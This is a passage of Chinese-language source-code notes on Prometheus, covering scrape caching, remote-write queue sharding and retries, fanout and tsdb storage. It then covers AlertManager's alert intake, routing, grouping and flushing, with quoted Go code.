map[uint64]labels.Labels\n\tseriesPrev map[uint64]labels.Labels\n    //缓存上次采集的指标\n}\n\nfunc newScrapeCache() *scrapeCache {\n\treturn &scrapeCache{\n\t\tentries:    map[string]*cacheEntry{},\n\t\tdropped:    map[string]*uint64{},\n\t\tseriesCur:  map[uint64]labels.Labels{},\n\t\tseriesPrev: map[uint64]labels.Labels{},\n\t}\n}\n```\n\nscrapeCache主要方法：\n\niterDone()；用于scrapeCache缓存整理\n\nget:根据指标信息met获取cacheEntry结构\n\naddRef：根据指标信息增加cacheEntry节点\n\naddDropped:添加无效指标信息到dropped\n\ngetDropped: 判断met是否为无效指标\n\ntrackStaleness:添加不带时间戳的指标到seriesCur列表\n\nforEachStale：查找过期的指标\n\n```go\nfunc (sl *scrapeLoop) append(b []byte, ts time.Time) (total, added int, err error) {\n\tvar (\n\t\tapp            = sl.appender()\n\t\tp              = textparse.New(b)\n\t\tdefTime        = timestamp.FromTime(ts)\n\t\tnumOutOfOrder  = 0\n\t\tnumDuplicates  = 0\n\t\tnumOutOfBounds = 0\n\t)\n\tvar sampleLimitErr error\n\nloop:\n\tfor p.Next() {\n\t\ttotal++\n\n\t\tt := defTime\n\t\tmet, tp, v := p.At()\n\t\tif tp != nil {\n\t\t\tt = *tp\n\t\t}\n\n\t\tif sl.cache.getDropped(yoloString(met)) {\n\t\t\tcontinue\n\t\t}\n\t\tce, ok := sl.cache.get(yoloString(met))\n\t\tif ok {\n\t\t\tswitch err = app.AddFast(ce.lset, ce.ref, t, v); err {\n\t\t\tcase nil:\n\t\t\t\tif tp == nil {\n\t\t\t\t\tsl.cache.trackStaleness(ce.hash, ce.lset)\n\t\t\t\t}\n\t\t\tcase storage.ErrNotFound:\n\t\t\t\tok = false\n\t\t\tcase storage.ErrOutOfOrderSample:\n\t\t\t\tnumOutOfOrder++\n\t\t\t\tlevel.Debug(sl.l).Log(\"msg\", \"Out of order sample\", \"series\", string(met))\n\t\t\t\ttargetScrapeSampleOutOfOrder.Inc()\n\t\t\t\tcontinue\n\t\t\tcase storage.ErrDuplicateSampleForTimestamp:\n\t\t\t\tnumDuplicates++\n\t\t\t\tlevel.Debug(sl.l).Log(\"msg\", \"Duplicate sample for timestamp\", \"series\", string(met))\n\t\t\t\ttargetScrapeSampleDuplicate.Inc()\n\t\t\t\tcontinue\n\t\t\tcase storage.ErrOutOfBounds:\n\t\t\t\tnumOutOfBounds++\n\t\t\t\tlevel.Debug(sl.l).Log(\"msg\", \"Out of bounds metric\", \"series\", string(met))\n\t\t\t\ttargetScrapeSampleOutOfBounds.Inc()\n\t\t\t\tcontinue\n\t\t\tcase errSampleLimit:\n\t\t\t\t// Keep on parsing output if we hit the limit, so we report the correct\n\t\t\t\t// total number of samples scraped.\n\t\t\t\tsampleLimitErr = err\n\t\t\t\tadded++\n\t\t\t\tcontinue\n\t\t\tdefault:\n\t\t\t\tbreak loop\n\t\t\t}\n\t\t}\n\t\tif !ok {\n\t\t\tvar lset labels.Labels\n\n\t\t\tmets := p.Metric(&lset)\n\t\t\thash := lset.Hash()\n\n\t\t\t// Hash label set as it is seen local to the target. Then add target labels\n\t\t\t// and relabeling and store the final label set.\n\t\t\tlset = sl.sampleMutator(lset)\n\n\t\t\t// The label set may be set to nil to indicate dropping.\n\t\t\tif lset == nil {\n\t\t\t\tsl.cache.addDropped(mets)\n\t\t\t\tcontinue\n\t\t\t}\n\n\t\t\tvar ref uint64\n\t\t\tref, err = app.Add(lset, t, v)\n\t\t\t// TODO(fabxc): also add a dropped-cache?\n\t\t\tswitch err {\n\t\t\tcase nil:\n\t\t\tcase storage.ErrOutOfOrderSample:\n\t\t\t\terr = nil\n\t\t\t\tnumOutOfOrder++\n\t\t\t\tlevel.Debug(sl.l).Log(\"msg\", \"Out of order sample\", \"series\", string(met))\n\t\t\t\ttargetScrapeSampleOutOfOrder.Inc()\n\t\t\t\tcontinue\n\t\t\tcase storage.ErrDuplicateSampleForTimestamp:\n\t\t\t\terr = nil\n\t\t\t\tnumDuplicates++\n\t\t\t\tlevel.Debug(sl.l).Log(\"msg\", \"Duplicate sample for timestamp\", \"series\", string(met))\n\t\t\t\ttargetScrapeSampleDuplicate.Inc()\n\t\t\t\tcontinue\n\t\t\tcase storage.ErrOutOfBounds:\n\t\t\t\terr = nil\n\t\t\t\tnumOutOfBounds++\n\t\t\t\tlevel.Debug(sl.l).Log(\"msg\", \"Out of bounds metric\", \"series\", string(met))\n\t\t\t\ttargetScrapeSampleOutOfBounds.Inc()\n\t\t\t\tcontinue\n\t\t\tcase errSampleLimit:\n\t\t\t\tsampleLimitErr = err\n\t\t\t\tadded++\n\t\t\t\tcontinue\n\t\t\tdefault:\n\t\t\t\tlevel.Debug(sl.l).Log(\"msg\", \"unexpected error\", \"series\", string(met), \"err\", err)\n\t\t\t\tbreak loop\n\t\t\t}\n\t\t\tif tp == nil {\n\t\t\t\t// Bypass staleness logic if there is an explicit timestamp.\n\t\t\t\tsl.cache.trackStaleness(hash, lset)\n\t\t\t}\n\t\t\tsl.cache.addRef(mets, ref, lset, hash)\n\t\t}\n\t\tadded++\n\t}\n\tif err == nil {\n\t\terr = p.Err()\n\t}\n\tif sampleLimitErr != nil {\n\t\t// We only want to increment this once per scrape, so this is Inc'd outside the loop.\n\t\ttargetScrapeSampleLimit.Inc()\n\t}\n\tif numOutOfOrder > 0 {\n\t\tlevel.Warn(sl.l).Log(\"msg\", \"Error on ingesting out-of-order samples\", \"num_dropped\", numOutOfOrder)\n\t}\n\tif numDuplicates > 0 {\n\t\tlevel.Warn(sl.l).Log(\"msg\", \"Error on ingesting samples with different value but same timestamp\", \"num_dropped\", numDuplicates)\n\t}\n\tif numOutOfBounds > 0 {\n\t\tlevel.Warn(sl.l).Log(\"msg\", \"Error on ingesting samples that are too old or are too far into the future\", \"num_dropped\", numOutOfBounds)\n\t}\n\tif err == nil {\n\t\tsl.cache.forEachStale(func(lset labels.Labels) bool {\n\t\t\t// Series no longer exposed, mark it stale.\n\t\t\t_, err = app.Add(lset, defTime, math.Float64frombits(value.StaleNaN))\n\t\t\tswitch err {\n\t\t\tcase storage.ErrOutOfOrderSample, storage.ErrDuplicateSampleForTimestamp:\n\t\t\t\t// Do not count these in logging, as this is expected if a target\n\t\t\t\t// goes away and comes back again with a new scrape loop.\n\t\t\t\terr = nil\n\t\t\t}\n\t\t\treturn err == nil\n\t\t})\n\t}\n\tif err != nil {\n\t\tapp.Rollback()\n\t\treturn total, added, err\n\t}\n\tif err := app.Commit(); err != nil {\n\t\treturn total, added, err\n\t}\n\n\tsl.cache.iterDone()\n\n\treturn total, added, nil\n}\n```\n\n存储指标append方法的具体实现，\n\n存储指标的流程：\n\n![1572417134533](/images/1572417134533.png)\n\nprometheus支持远程存储，也支持本地存储。\n\nremote中为远程存储，\n\ntsdb中为本地存储\n\n远程存储：存储的数据，发送过来的样本先放入到队列中，这个队列的最大分片是1000，每个分片没秒1000个sample，那么一秒就可以发送1000*1000个sample。\n\n数据结构为：\n\n```go\n// QueueManager manages a queue of samples to be sent to the Storage\n// indicated by the provided StorageClient.\ntype QueueManager struct {\n\tlogger log.Logger\n\n\tcfg            config.QueueConfig                     //队列配置\n\texternalLabels model.LabelSet                         //\n\trelabelConfigs []*config.RelabelConfig \n\tclient         StorageClient                          // 存储客户端\n\tqueueName      string                                 //队列名称\n\tlogLimiter     *rate.Limiter                          //限流\n \n\tshardsMtx   sync.Mutex\n\tshards      *shards                                   //分片\n\tnumShards   int                                       //分片数目\n\treshardChan chan int\n\tquit        chan struct{}\n\twg          sync.WaitGroup\n\n\tsamplesIn, samplesOut, samplesOutDuration *ewmaRate\n\tintegralAccumulator                       float64\n}\n```\n\n构建好发送队列的函数：\n\n```go\n// NewQueueManager builds a new QueueManager.\nfunc NewQueueManager(logger log.Logger, cfg config.QueueConfig, externalLabels model.LabelSet, relabelConfigs []*config.RelabelConfig, client StorageClient) *QueueManager {\n\tif logger == nil {\n\t\tlogger = log.NewNopLogger()\n\t}\n\tt := &QueueManager{\n\t\tlogger:         logger,\n\t\tcfg:            cfg,\n\t\texternalLabels: externalLabels,\n\t\trelabelConfigs: relabelConfigs,\n\t\tclient:         client,\n\t\tqueueName:      client.Name(),\n\n\t\tlogLimiter:  rate.NewLimiter(logRateLimit, logBurst),\n\t\tnumShards:   1,\n\t\treshardChan: make(chan int),\n\t\tquit:        make(chan struct{}),\n\n\t\tsamplesIn:          newEWMARate(ewmaWeight, shardUpdateDuration),\n\t\tsamplesOut:         newEWMARate(ewmaWeight, shardUpdateDuration),\n\t\tsamplesOutDuration: newEWMARate(ewmaWeight, shardUpdateDuration),\n\t}\n\tt.shards = t.newShards(t.numShards)\n\tnumShards.WithLabelValues(t.queueName).Set(float64(t.numShards))\n\tqueueCapacity.WithLabelValues(t.queueName).Set(float64(t.cfg.Capacity))\n\n\t// Initialise counter labels to zero.\n    //初始化\n\tsentBatchDuration.WithLabelValues(t.queueName)                  \n\tsucceededSamplesTotal.WithLabelValues(t.queueName)\n\tfailedSamplesTotal.WithLabelValues(t.queueName)\n\tdroppedSamplesTotal.WithLabelValues(t.queueName)\n\treturn t\n}\n```\n\n调用append方法来添加样本数据到队列分片中\n\n```go\n// Append queues a sample to be sent to the remote storage. It drops the\n// sample on the floor if the queue is full.\n// Always returns nil.\nfunc (t *QueueManager) Append(s *model.Sample) error {\n\tvar snew model.Sample\n\tsnew = *s\n\tsnew.Metric = s.Metric.Clone()\n\n\tfor ln, lv := range t.externalLabels {\n\t\tif _, ok := s.Metric[ln]; !ok {\n\t\t\tsnew.Metric[ln] = lv\n\t\t}\n\t}\n\n\tsnew.Metric = model.Metric(\n\t\trelabel.Process(model.LabelSet(snew.Metric), t.relabelConfigs...))\n\n\tif snew.Metric == nil {\n\t\treturn nil\n\t}\n\n\tt.shardsMtx.Lock()\n\tenqueued := t.shards.enqueue(&snew)\n\tt.shardsMtx.Unlock()\n\n\tif enqueued {\n\t\tqueueLength.WithLabelValues(t.queueName).Inc()\n\t} else {\n\t\tdroppedSamplesTotal.WithLabelValues(t.queueName).Inc()\n\t\tif t.logLimiter.Allow() {\n\t\t\tlevel.Warn(t.logger).Log(\"msg\", \"Remote storage queue full, discarding sample. Multiple subsequent messages of this kind may be suppressed.\")\n\t\t}\n\t}\n\treturn nil\n}\n```\n\n其中使用的函数enqueue发送到队列里面：\n\n```go\nfunc (s *shards) enqueue(sample *model.Sample) bool {\n\ts.qm.samplesIn.incr(1)\n\n\tfp := sample.Metric.FastFingerprint()\n\tshard := uint64(fp) % uint64(len(s.queues))\n\n\tselect {\n\tcase s.queues[shard] <- sample:\n\t\treturn true\n\tdefault:\n\t\treturn false\n\t}\n}\n```\n\n这个队列存储里面用余数去分组的。\n\n使用start方法来启动队列发送任务：\n\n```go\nfunc (s *shards) start() {\n\tfor i := 0; i < len(s.queues); i++ {\n\t\tgo s.runShard(i)\n\t}\n}\n```\n\n函数runShared生成多个协程去执行：\n\n```go\nfunc (s *shards) runShard(i int) {\n\tdefer s.wg.Done()\n\tqueue := s.queues[i]\n\n\t// Send batches of at most MaxSamplesPerSend samples to the remote storage.\n\t// If we have fewer samples than that, flush them out after a deadline\n\t// anyways.\n\tpendingSamples := model.Samples{}\n\n\tfor {\n\t\tselect {\n\t\tcase sample, ok := <-queue:\n\t\t\tif !ok {\n\t\t\t\tif len(pendingSamples) > 0 {\n\t\t\t\t\tlevel.Debug(s.qm.logger).Log(\"msg\", \"Flushing samples to remote storage...\", \"count\", len(pendingSamples))\n\t\t\t\t\ts.sendSamples(pendingSamples)\n\t\t\t\t\tlevel.Debug(s.qm.logger).Log(\"msg\", \"Done flushing.\")\n\t\t\t\t}\n\t\t\t\treturn\n\t\t\t}\n\n\t\t\tqueueLength.WithLabelValues(s.qm.queueName).Dec()\n\t\t\tpendingSamples = append(pendingSamples, sample)\n\n\t\t\tfor len(pendingSamples) >= s.qm.cfg.MaxSamplesPerSend {\n\t\t\t\ts.sendSamples(pendingSamples[:s.qm.cfg.MaxSamplesPerSend])\n\t\t\t\tpendingSamples = pendingSamples[s.qm.cfg.MaxSamplesPerSend:]\n\t\t\t}\n\t\tcase <-time.After(s.qm.cfg.BatchSendDeadline):\n\t\t\tif len(pendingSamples) > 0 {\n\t\t\t\ts.sendSamples(pendingSamples)\n\t\t\t\tpendingSamples = pendingSamples[:0]\n\t\t\t}\n\t\t}\n\t}\n}\n```\n\n其中调用了方法sendSamples去发送样本：\n\n```go\nfunc (s *shards) sendSamples(samples model.Samples) {\n\tbegin := time.Now()\n\ts.sendSamplesWithBackoff(samples)\n\n\t// These counters are used to caclulate the dynamic sharding, and as such\n\t// should be maintained irrespective of success or failure.\n\ts.qm.samplesOut.incr(int64(len(samples)))\n\ts.qm.samplesOutDuration.incr(int64(time.Since(begin)))\n}\n```\n\n其中方法使用了samplesOut和samplesOutDuration来计算分片的动态变化。保证成功发送和失败的数目。\n\n启动调用函数sendSamplesWithBackOff函数来保证远程发送的时候失败的情况：\n\n```go\nfunc (s *shards) sendSamplesWithBackoff(samples model.Samples) {\n\tbackoff := s.qm.cfg.MinBackoff\n\tfor retries := s.qm.cfg.MaxRetries; retries > 0; retries-- {\n\t\tbegin := time.Now()\n\t\treq := ToWriteRequest(samples)\n\t\terr := s.qm.client.Store(req)\n\n\t\tsentBatchDuration.WithLabelValues(s.qm.queueName).Observe(time.Since(begin).Seconds())\n\t\tif err == nil {\n\t\t\tsucceededSamplesTotal.WithLabelValues(s.qm.queueName).Add(float64(len(samples)))\n\t\t\treturn\n\t\t}\n\n\t\tlevel.Warn(s.qm.logger).Log(\"msg\", \"Error sending samples to remote storage\", \"count\", len(samples), \"err\", err)\n\t\tif _, ok := err.(recoverableError); !ok {\n\t\t\tbreak\n\t\t}\n\t\ttime.Sleep(backoff)\n\t\tbackoff = backoff * 2\n\t\tif backoff > s.qm.cfg.MaxBackoff {\n\t\t\tbackoff = s.qm.cfg.MaxBackoff\n\t\t}\n\t}\nfailedSamplesTotal.WithLabelValues(s.qm.queueName).Add(float64(len(samples)))\n}\n```\n\n如果发送失败会重试几次，如果还是失败，会将发送失败的样本计入失败的计算器。\n\n如果成功，会调用Client中的Store方法：\n\n```go\nfunc (c *Client) Store(req *prompb.WriteRequest) error {\n\tdata, err := proto.Marshal(req)\n\tif err != nil {\n\t\treturn err\n\t}\n\n\tcompressed := snappy.Encode(nil, data)\n\thttpReq, err := http.NewRequest(\"POST\", c.url.String(), bytes.NewReader(compressed))\n\tif err != nil {\n\t\t// Errors from NewRequest are from unparseable URLs, so are not\n\t\t// recoverable.\n\t\treturn err\n\t}\n\thttpReq.Header.Add(\"Content-Encoding\", \"snappy\")\n\thttpReq.Header.Set(\"Content-Type\", \"application/x-protobuf\")\n\thttpReq.Header.Set(\"X-Prometheus-Remote-Write-Version\", \"0.1.0\")\n\n\tctx, cancel := context.WithTimeout(context.Background(), c.timeout)\n\tdefer cancel()\n\n\thttpResp, err := ctxhttp.Do(ctx, c.client, httpReq)\n\tif err != nil {\n\t\t// Errors from client.Do are from (for example) network errors, so are\n\t\t// recoverable.\n\t\treturn recoverableError{err}\n\t}\n\tdefer httpResp.Body.Close()\n\n\tif httpResp.StatusCode/100 != 2 {\n\t\tscanner := bufio.NewScanner(io.LimitReader(httpResp.Body, maxErrMsgLen))\n\t\tline := \"\"\n\t\tif scanner.Scan() {\n\t\t\tline = scanner.Text()\n\t\t}\n\t\terr = fmt.Errorf(\"server returned HTTP status %s: %s\", httpResp.Status, line)\n\t}\n\tif httpResp.StatusCode/100 == 5 {\n\t\treturn recoverableError{err}\n\t}\n\treturn err\n}\n```\n\n通过post方式，发送数据。\n\n本地存储主要使用的tsdb库中，后面的版本对tsdb有较为大的变化。\n\nfanout为本地和远程的读写代理器，入口在fanout中，fanout的数据结构\n\n```go\ntype fanout struct {\n\tlogger log.Logger\n\n\tprimary     Storage\n\tsecondaries []Storage\n}\n```\n\n初始化数据结构：\n\n```go\n// NewFanout returns a new fan-out Storage, which proxies reads and writes\n// through to multiple underlying storages.\nfunc NewFanout(logger log.Logger, primary Storage, secondaries ...Storage) Storage {\n\treturn &fanout{\n\t\tlogger:      logger,\n\t\tprimary:     primary,\n\t\tsecondaries: secondaries,\n\t}\n}\n```\n\n添加数据使用appender方法：\n\n```go\nfunc (f *fanout) Appender() (Appender, error) {\n\tprimary, err := f.primary.Appender()\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\n\tsecondaries := make([]Appender, 0, len(f.secondaries))\n\tfor _, storage := range f.secondaries {\n\t\tappender, err := storage.Appender()\n\t\tif err != nil {\n\t\t\treturn nil, err\n\t\t}\n\t\tsecondaries = append(secondaries, appender)\n\t}\n\treturn &fanoutAppender{\n\t\tlogger:      f.logger,\n\t\tprimary:     primary,\n\t\tsecondaries: secondaries,\n\t}, nil\n}\n```\n\n本地存储使用tsdb来存储：\n\nprometheus中提供了接口，调用tsdb数据库来进行存储。tsdb后续单独来说明。\n\n打开一个db库函数：\n\n```go\nfunc Open(path string, l log.Logger, r prometheus.Registerer, opts *Options) (*tsdb.DB, error) {\n\tif opts.MinBlockDuration > opts.MaxBlockDuration {\n\t\topts.MaxBlockDuration = opts.MinBlockDuration\n\t}\n\t// Start with smallest block duration and create exponential buckets until the exceed the\n\t// configured maximum block duration.\n\trngs := tsdb.ExponentialBlockRanges(int64(time.Duration(opts.MinBlockDuration).Seconds()*1000), 10, 3)\n\n\tfor i, v := range rngs {\n\t\tif v > int64(time.Duration(opts.MaxBlockDuration).Seconds()*1000) {\n\t\t\trngs = rngs[:i]\n\t\t\tbreak\n\t\t}\n\t}\n\n\tdb, err := tsdb.Open(path, l, r, &tsdb.Options{\n\t\tWALFlushInterval:  10 * time.Second,\n\t\tRetentionDuration: uint64(time.Duration(opts.Retention).Seconds() * 1000),\n\t\tBlockRanges:       rngs,\n\t\tNoLockfile:        opts.NoLockfile,\n\t})\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\treturn db, nil\n}\n```\n\n\n\n## AlertManager\n\n接收告警信息请求的地址为：http://localhost:9093/api/v1/alerts，api接收告警信息后会进入到api.addAlerts中。\n\nAlertManager服务启动时候，api.addAlerts方法会通过api.Register方法再路由中完成路由请求地址的注册。\n\n在api.addAlerts方法中，会将从参数r中接受到的告警信息解析为types.Alert数组，最后将其插入本地缓存中。\n\n```go\nfunc (api *API) addAlerts(w http.ResponseWriter, r *http.Request) {\n\tvar alerts []*types.Alert\n\tif err := receive(r, &alerts); err != nil {\n\t\trespondError(w, apiError{\n\t\t\ttyp: errorBadData,\n\t\t\terr: err,\n\t\t}, nil)\n\t\treturn\n\t}\n\n\tapi.insertAlerts(w, r, alerts...)\n}\n\nfunc receive(r *http.Request, v interface{}) error {\n\tdec := json.NewDecoder(r.Body)\n\tdefer r.Body.Close()\n\n\terr := dec.Decode(v)\n\tif err != nil {\n\t\tlog.Debugf(\"Decoding request failed: %v\", err)\n\t}\n\treturn err\n}\n```\n\n告警调度：\n\n告警信息被插入AlertManager本地缓存后，会通过告警调度服务从本地缓存中获取告警信息，并将告警信息发送出去。\n\n本地缓存基于内存实现，\n\n告警调度服务的初始化代码在main中，reload方法完成，\n\n```go\nreload := func() (err error) {\n\t\tlog.With(\"file\", *configFile).Infof(\"Loading configuration file\")\n\t\tdefer func() {\n\t\t\tif err != nil {\n\t\t\t\tlog.With(\"file\", *configFile).Errorf(\"Loading configuration file failed: %s\", err)\n\t\t\t\tconfigSuccess.Set(0)\n\t\t\t} else {\n\t\t\t\tconfigSuccess.Set(1)\n\t\t\t\tconfigSuccessTime.Set(float64(time.Now().Unix()))\n\t\t\t\tconfigHash.Set(hash)\n\t\t\t}\n\t\t}()\n\n\t\tconf, plainCfg, err := config.LoadFile(*configFile)\n\t\tif err != nil {\n\t\t\treturn err\n\t\t}\n\n\t\thash = md5HashAsMetricValue(plainCfg)\n\n\t\terr = apiv.Update(conf, time.Duration(conf.Global.ResolveTimeout))\n\t\tif err != nil {\n\t\t\treturn err\n\t\t}\n\n\t\ttmpl, err = template.FromGlobs(conf.Templates...)\n\t\tif err != nil {\n\t\t\treturn err\n\t\t}\n\t\ttmpl.ExternalURL = amURL\n\n\t\tinhibitor.Stop()\n\t\tdisp.Stop()\n\n\t\tinhibitor = inhibit.NewInhibitor(alerts, conf.InhibitRules, marker)\n\t\tpipeline = notify.BuildPipeline(\n\t\t\tconf.Receivers,\n\t\t\ttmpl,\n\t\t\twaitFunc,\n\t\t\tinhibitor,\n\t\t\tsilences,\n\t\t\tnotificationLog,\n\t\t\tmarker,\n\t\t)\n\t\tdisp = dispatch.NewDispatcher(alerts, dispatch.NewRoute(conf.Route, nil), pipeline, marker, timeoutFunc)\n\n\t\tgo disp.Run()\n\t\tgo inhibitor.Run()\n\n\t\treturn nil\n\t}\n```\n\nRun方法具体实现如下：\n\n```go\n\n// Run starts dispatching alerts incoming via the updates channel.\nfunc (d *Dispatcher) Run() {\n\td.done = make(chan struct{})\n\n\td.mtx.Lock()\n\td.aggrGroups = map[*Route]map[model.Fingerprint]*aggrGroup{}\n\td.mtx.Unlock()\n\n\td.ctx, d.cancel = context.WithCancel(context.Background())\n\n\td.run(d.alerts.Subscribe())\n\tclose(d.done)\n}\n```\n\nSubscribe方法：\n\n```go\n\n// Subscribe returns an iterator over active alerts that have not been\n// resolved and successfully notified about.\n// They are not guaranteed to be in chronological order.\nfunc (a *Alerts) Subscribe() provider.AlertIterator {\n\tvar (\n\t\tch   = make(chan *types.Alert, 200)\n\t\tdone = make(chan struct{})\n\t)\n\talerts, err := a.getPending()\n\n\ta.mtx.Lock()\n\ti := a.next\n\ta.next++\n\ta.listeners[i] = ch\n\ta.mtx.Unlock()\n\n\tgo func() {\n\t\tdefer func() {\n\t\t\ta.mtx.Lock()\n\t\t\tdelete(a.listeners, i)\n\t\t\tclose(ch)\n\t\t\ta.mtx.Unlock()\n\t\t}()\n\t\t//遍历告警列表\n\t\tfor _, a := range alerts {\n\t\t\tselect {\n                //将告警信息放入通道ch中\n\t\t\tcase ch <- a:\n\t\t\tcase <-done:\n\t\t\t\treturn\n\t\t\t}\n\t\t}\n\n\t\t<-done\n\t}()\n\t//构建告警信息迭代器\n\treturn provider.NewAlertIterator(ch, done, err)\n}\n\n// NewAlertIterator returns a new AlertIterator based on the generic alertIterator type\nfunc NewAlertIterator(ch <-chan *types.Alert, done chan struct{}, err error) AlertIterator {\n\treturn &alertIterator{\n\t\tch:   ch,\n\t\tdone: done,\n\t\terr:  err,\n\t}\n}\n```\n\nrun方法中，对告警信息的处理分为4步：获取告警信息，告警路由匹配，告警信息处理，清除告警信息为空的aggrGroup。\n\n```go\nfunc (d *Dispatcher) run(it provider.AlertIterator) {\n\tcleanup := time.NewTicker(30 * time.Second)\n\tdefer cleanup.Stop()\n\n\tdefer it.Close()\n\n\tfor {\n\t\tselect {\n\t\tcase alert, ok := <-it.Next():\n\t\t\tif !ok {\n\t\t\t\t// Iterator exhausted for some reason.\n\t\t\t\tif err := it.Err(); err != nil {\n\t\t\t\t\tlog.Errorf(\"Error on alert update: %s\", err)\n\t\t\t\t}\n\t\t\t\treturn\n\t\t\t}\n\n\t\t\td.log.With(\"alert\", alert).Debug(\"Received alert\")\n\n\t\t\t// Log errors but keep trying.\n\t\t\tif err := it.Err(); err != nil {\n\t\t\t\tlog.Errorf(\"Error on alert update: %s\", err)\n\t\t\t\tcontinue\n\t\t\t}\n\t\t\t//告警信息路由匹配\n\t\t\tfor _, r := range d.route.Match(alert.Labels) {\n\t\t\t\td.processAlert(alert, r)\n\t\t\t}\n\n\t\tcase <-cleanup.C:\n\t\t\td.mtx.Lock()\n\t\t\t//每隔30s清除为空的告警组\n\t\t\tfor _, groups := range d.aggrGroups {\n\t\t\t\tfor _, ag := range groups {\n\t\t\t\t\tif ag.empty() {\n\t\t\t\t\t\tag.stop()\n\t\t\t\t\t\tdelete(groups, ag.fingerprint())\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\t\t\td.mtx.Unlock()\n\n\t\tcase <-d.ctx.Done():\n\t\t\treturn\n\t\t}\n\t}\n}\n```\n\n流程：\n\n![1572418287763](/images/1572418287763.png)\n\n告警匹配：\n\nAlertManager以路由匹配方式实现了告警分组，不同分组下的告警可以使用各不同的告警接受方式，告警组等待时间，告警组发送间隔，重复告警发送间隔。\n\n```go\n// Match does a depth-first left-to-right search through the route tree\n// and returns the matching routing nodes.\nfunc (r *Route) Match(lset model.LabelSet) []*Route {\n\tif !r.Matchers.Match(lset) {\n\t\treturn nil\n\t}\n\n\tvar all []*Route\n\n\tfor _, cr := range r.Routes {\n\t\tmatches := cr.Match(lset)\n\n\t\tall = append(all, matches...)\n\n\t\tif matches != nil && !cr.Continue {\n\t\t\tbreak\n\t\t}\n\t}\n\n\t// If no child nodes were matches, the current node itself is a match.\n\tif len(all) == 0 {\n\t\tall = append(all, r)\n\t}\n\n\treturn all\n}\n```\n\n告警处理：\n\n```go\n// processAlert determines in which aggregation group the alert falls\n// and insert it.\nfunc (d *Dispatcher) processAlert(alert *types.Alert, route *Route) {\n\tgroup := model.LabelSet{}\n\t//获取分组的维度和纬度值\n\tfor ln, lv := range alert.Labels {\n\t\tif _, ok := route.RouteOpts.GroupBy[ln]; ok {\n\t\t\tgroup[ln] = lv\n\t\t}\n\t}\n\n\tfp := group.Fingerprint()\n\n\td.mtx.Lock()\n\tgroups, ok := d.aggrGroups[route]\n    //判断是否需要新建告警组\n\tif !ok {\n\t\tgroups = map[model.Fingerprint]*aggrGroup{}\n\t\td.aggrGroups[route] = groups\n\t}\n\td.mtx.Unlock()\n\n\t// If the group does not exist, create it.\n\tag, ok := groups[fp]\n    //判断是否新建路由组\n\tif !ok {\n\t\tag = newAggrGroup(d.ctx, group, route, d.timeout)\n\t\tgroups[fp] = ag\n\t\t//启动告警组\n\t\tgo ag.run(func(ctx context.Context, alerts ...*types.Alert) bool {\n\t\t\t_, _, err := d.stage.Exec(ctx, alerts...)\n\t\t\tif err != nil {\n\t\t\t\tlog.Errorf(\"Notify for %d alerts failed: %s\", len(alerts), err)\n\t\t\t}\n\t\t\treturn err == nil\n\t\t})\n\t}\n\n\tag.insert(alert)\n}\n```\n\nrun方法：\n\n```go\nfunc (ag *aggrGroup) run(nf notifyFunc) {\n\tag.done = make(chan struct{})\n\n\tdefer close(ag.done)\n\tdefer ag.next.Stop()\n\n\tfor {\n\t\tselect {\n\t\tcase now := <-ag.next.C:\n\t\t\t// Give the notifcations time until the next flush to\n\t\t\t// finish before terminating them.\n\t\t\tctx, cancel := context.WithTimeout(ag.ctx, ag.timeout(ag.opts.GroupInterval))\n\n\t\t\t// The now time we retrieve from the ticker is the only reliable\n\t\t\t// point of time reference for the subsequent notification pipeline.\n\t\t\t// Calculating the current time directly is prone to flaky behavior,\n\t\t\t// which usually only becomes apparent in tests.\n            //记录告警开始时间\n\t\t\tctx = notify.WithNow(ctx, now)\n\n\t\t\t// Populate context with information needed along the pipeline.\n\t\t\tctx = notify.WithGroupKey(ctx, ag.GroupKey())\n\t\t\tctx = notify.WithGroupLabels(ctx, ag.labels)\n\t\t\tctx = notify.WithReceiverName(ctx, ag.opts.Receiver)\n\t\t\tctx = notify.WithRepeatInterval(ctx, ag.opts.RepeatInterval)\n\n\t\t\t// Wait the configured interval before calling flush again.\n\t\t\tag.mtx.Lock()\n\t\t\tag.next.Reset(ag.opts.GroupInterval)\n\t\t\tag.mtx.Unlock()\n\n\t\t\tag.flush(func(alerts ...*types.Alert) bool {\n\t\t\t\treturn nf(ctx, alerts...)\n\t\t\t})\n\n\t\t\tcancel()\n\n\t\tcase <-ag.ctx.Done():\n\t\t\treturn\n\t\t}\n\t}\n}\n```\n\nflush方法中对告警信息进行两次复制，并分别将其缓存到alerts和alertsSlice中，告警信息通过传入的参数notify再次告警通知，之后再告警列表中删除过期的告警。\n\nflush方法：\n\n```go\n// flush sends notifications for all new alerts.\nfunc (ag *aggrGroup) flush(notify func(...*types.Alert) bool) {\n\tif ag.empty() {\n\t\treturn\n\t}\n\tag.mtx.Lock()\n\n\tvar (\n\t\talerts      = make(map[model.Fingerprint]*types.Alert, len(ag.alerts))\n\t\talertsSlice = make([]*types.Alert, 0, len(ag.alerts))\n\t)\n\tfor fp, alert := range ag.alerts {\n\t\talerts[fp] = alert\n\t\talertsSlice = append(alertsSlice, alert)\n\t}\n\n\tag.mtx.Unlock()\n\n\tag.log.Debugln(\"flushing\", alertsSlice)\n\n\tif notify(alertsSlice...) {\n\t\tag.mtx.Lock()\n\t\tfor fp, a := range alerts {\n\t\t\t// Only delete if the fingerprint has not been inserted\n\t\t\t// again since we notified about it.\n\t\t\tif a.Resolved() && ag.alerts[fp] == a {\n\t\t\t\tdelete(ag.alerts, fp)\n\t\t\t}\n\t\t}\n\n\t\tag.hasSent = true\n\t\tag.mtx.Unlock()\n\t}\n}\n```\n\n告警的过期时间由alertmanager.yml配置文件中的resolve_timeout配置项指定，默认5m.\n\nflush方法的notify参数为func(...*types.Alert) bool类型，而notify方法最终会调用d.stage.Exec进行告警处理。\n\n主要流程：\n\n![1572418713584](/images/1572418713584.png)\n\n\n\n告警通知：\n\n主要流程：\n\n1）main方法中调用notify.BuildPipeline方法生成RoutingStage，并作为参数传递到dispatcher的NewDispatcher方法中，从而完成调度器Dispatcher的构建，并将RoutingStage赋值给调度器成stage.\n\n2）processAlerts定义匿名回调方法func(ctx context.Context, alerts ... *types.Alert) bool 再匿名方法的实现调用d.stage.Exec(ctx, alerts...)发送告警。\n\nBuildPipeline构建一个执行的调用链，该链有RoutingStage，MultiStage,FanoutStage, inhibitStage, SilenceStage, WaitStage, DehupStage等多阶段。\n\n```go\n// BuildPipeline builds a map of receivers to 